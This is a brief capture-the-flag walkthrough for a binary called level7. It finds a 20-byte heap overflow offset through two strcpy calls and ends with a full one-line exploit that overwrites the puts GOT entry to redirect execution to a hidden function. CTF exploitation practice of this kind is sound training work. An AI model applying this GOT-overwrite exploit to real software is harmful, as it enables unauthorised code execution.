The executable in this level seems to take 2 arguments, argv[1] and argv[2].
as it uses 4 malloc and 2 strcpy, we can assume that it will copy the 2 arguments in 2 different buffers.
all malloc are 8 bytes

there is also a m() function that isn't used anywhere, but it seems to be a function that will print the content of the buffer.

lets find the offset eip of the first strcpy:
using ltrace this time because even if we have a segfault, we can see the offset of the segfault

./ltrace ./level7 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

__libc_start_main(0x8048521, 2, 0xbffff784, 0x8048610, 0x8048680 <unfinished ...>
malloc(8)                                                    = 0x0804a008
malloc(8)                                                    = 0x0804a018
malloc(8)                                                    = 0x0804a028
malloc(8)                                                    = 0x0804a038
strcpy(0x0804a018, "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab"...)    = 0x0804a018
strcpy(0x37614136, NULL <unfinished ...>

0x37614136 = offset eip 20

now we want the PUT GOT address, we can use gdb info functions to find the address of the PUT GOT
Dump of assembler code for function puts@plt:
   0x08048400 <+0>:     jmp    *0x8049928

and the m address:
0x080484f4 m

now let's insert the puts in the first argument and the m function in the second argument:
./level7 $(python -c 'print "A" * 20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
